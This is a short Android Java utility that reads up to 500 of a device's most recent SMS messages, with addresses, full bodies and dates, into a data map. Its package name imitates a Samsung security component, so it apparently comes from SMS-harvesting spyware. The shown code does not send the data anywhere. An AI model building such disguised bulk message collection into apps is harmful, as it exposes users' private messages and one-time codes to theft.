package com.samsung.android.security.v8.utils;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;

import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SmsUtil {
    
    public static Map<String, Object> getAllSms(Context context) {
        Map<String, Object> result = new HashMap<>();
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
                != PackageManager.PERMISSION_GRANTED) {
            result.put("error", "SMS permission not granted");
            return result;
        }
        
        List<Map<String, Object>> smsList = new ArrayList<>();
        
        try {
            Uri uri = Telephony.Sms.CONTENT_URI;
            String[] projection = {
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.READ
            };
            
            Cursor cursor = context.getContentResolver().query(
                    uri, projection, null, null, 
                    Telephony.Sms.DATE + " DESC LIMIT 500"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    Map<String, Object> sms = new HashMap<>();
                    
                    int idIndex = cursor.getColumnIndex(Telephony.Sms._ID);
                    int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                    int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
                    int dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
                    int typeIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);
                    int readIndex = cursor.getColumnIndex(Telephony.Sms.READ);
                    
                    if (idIndex >= 0) sms.put("id", cursor.getLong(idIndex));
                    if (addressIndex >= 0) sms.put("address", cursor.getString(addressIndex));
                    if (bodyIndex >= 0) sms.put("body", cursor.getString(bodyIndex));
                    if (dateIndex >= 0) sms.put("date", cursor.getLong(dateIndex));
                    if (typeIndex >= 0) {
                        int type = cursor.getInt(typeIndex);
                        sms.put("type", type == Telephony.Sms.MESSAGE_TYPE_INBOX ? "inbox" : 
                                       type == Telephony.Sms.MESSAGE_TYPE_SENT ? "sent" : "other");
                    }
                    if (readIndex >= 0) sms.put("read", cursor.getInt(readIndex) == 1);
                    
                    smsList.add(sms);
                }
                cursor.close();
            }
            
            result.put("sms", smsList);
            result.put("count", smsList.size());
            result.put("timestamp", System.currentTimeMillis());
            
        } catch (Exception e) {
            result.put("error", e.getMessage());
        }
        
        return result;
    }
}
